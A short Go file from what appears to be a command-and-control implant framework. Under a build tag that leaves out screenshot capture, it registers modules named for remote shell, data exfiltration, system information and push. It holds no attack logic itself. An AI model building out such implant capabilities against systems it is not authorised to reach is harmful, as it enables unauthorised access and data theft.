//go:build noscreenshot

package c2

func init() {
	RegisterModule(&ShellModule{})
	RegisterModule(&ExfilModule{})
	RegisterModule(&SysinfoModule{})
	RegisterModule(&PushModule{})
	// ScreenshotModule excluded (noscreenshot build tag) — drops
	// kbinani/screenshot and its platform dependencies from the binary.
}
